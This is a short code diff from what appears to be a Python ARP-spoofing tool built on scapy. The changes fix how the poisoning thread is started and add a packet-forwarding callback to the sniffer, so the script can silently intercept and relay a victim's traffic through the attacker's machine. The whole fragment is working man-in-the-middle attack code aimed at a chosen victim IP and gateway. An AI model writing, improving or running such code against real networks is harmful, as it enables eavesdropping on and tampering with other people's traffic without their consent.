@@ -48,14 +48,14 @@ if p.verbose:
 # There will be two threads: one for poisoning, and one for packet sniffing
 # For packet sniffing, wrpcap will be used (courtesy of scapy)
 verbosity = 1 if p.verbose else 0
-string_of_poison = Thread(target=arpPoison.poisoner, args=(gateway_IP=p.gatewayIP, victim_IP=p.victimIP,
-                                                           new_MAC=p.replaceMAC, verbose=verbosity,
-                                                           duration=p.duration))
+string_of_poison = Thread(target=arpPoison.poisoner, args=(p.gatewayIP, p.victimIP),
+                                                     kwargs={'new_MAC': p.replaceMAC, 'verbose': verbosity,
+                                                             'duration': p.duration})
 
 if p.verbose:
     print("Attack start")
 string_of_poison.start()
-packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, timeout=p.duration + 1)
+packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, timeout=p.duration + 1, prn=arpPoison.forward)
 
 string_of_poison.join()
 
